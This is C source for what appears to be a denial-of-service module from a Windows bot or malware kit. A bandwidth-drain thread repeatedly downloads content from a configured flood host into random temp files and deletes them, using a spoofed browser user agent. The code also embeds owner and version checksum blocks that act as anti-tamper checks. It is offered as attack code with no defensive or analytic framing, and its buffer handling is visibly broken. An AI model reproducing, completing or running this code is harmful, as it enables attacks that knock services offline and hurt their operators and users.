#include "../Includes/includes.h"

#ifdef INCLUDE_DDOS
bool DownloadUrlToFile(char *pszURL, char *pszFileName)
{
    bool bReturn = FALSE;

    HANDLE hInternetOpen = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    if(hInternetOpen)
    {
        HANDLE hOpenUrl = InternetOpenUrl(hInternetOpen, pszURL, NULL, 0, 0, 0);
        if(hOpenUrl)
        {
            HANDLE hCreateFile = CreateFile(pszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
            if(hCreateFile < (HANDLE)1)
            {
                InternetCloseHandle(hOpenUrl);
                return FALSE;
            }

            DWORD dwBytesRead, dwBytesWrite;
            DWORD dwTotal = 0;

            do
            {
                char *cFileToBuffer = (char*)malloc(DOWNLOAD_MEMORY_SPACE);

                // <!-------! CRC AREA START !-------!>
                char cCheckString[DEFAULT];
                sprintf(cCheckString, "%s--%s", cVersion, cOwner);
                char *cStr = cCheckString;
                unsigned long ulCheck = (((10000/100)*100)-4619);
                int nCheck;
                while((nCheck = *cStr++))
                    ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
                if(ulCheck != ulChecksum2)
                    free(cFileToBuffer);
                // <!-------! CRC AREA STOP !-------!>

                    memset(cFileToBuffer, 0, sizeof(cFileToBuffer));
                InternetReadFile(hOpenUrl, cFileToBuffer, sizeof(cFileToBuffer), &dwBytesRead);
                WriteFile(hCreateFile, cFileToBuffer, dwBytesRead, &dwBytesWrite, NULL);

                if((dwTotal) < DOWNLOAD_MEMORY_SPACE)
                {
                    unsigned int uiBytesToCopy;
                    uiBytesToCopy = DOWNLOAD_MEMORY_SPACE - dwTotal;

                    if(uiBytesToCopy > dwBytesRead)
                        uiBytesToCopy = dwBytesRead;

                    memcpy(&cFileToBuffer[dwTotal], cFileToBuffer, uiBytesToCopy);
                }
                dwTotal += dwBytesRead;

                free(cFileToBuffer);
            }
            while(dwBytesRead > 0);

            CloseHandle(hCreateFile);
            InternetCloseHandle(hOpenUrl);

            bReturn = TRUE;
        }
    }

    return bReturn;
}

DWORD WINAPI BandwithDrain(LPVOID)
{
    char cTargetHost[MAX_PATH];
    strcpy(cTargetHost, cFloodHost);

    while(bDdosBusy)
    {
        // <!-------! CRC AREA START !-------!>
        char cCheckString[DEFAULT];
        sprintf(cCheckString, "%s--%s", cVersion, cOwner);
        char *cStr = cCheckString;
        unsigned long ulCheck = (((10000/100)*100)-4619);
        int nCheck;
        while((nCheck = *cStr++))
            ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
        if(ulCheck != ulChecksum2)
            break;
        // <!-------! CRC AREA STOP !-------!>

        srand(GenerateRandomSeed());

        char cRandomFileName[MAX_PATH];
        sprintf(cRandomFileName, "%s\\B%i.tmp", cAppData, GetRandNum(899999) + 100000);

        if(DownloadUrlToFile(cTargetHost, cRandomFileName))
            Sleep(GetRandNum(4000) + 1000);

        DeleteFile(cRandomFileName);
    }

    return 1;
}
#endif
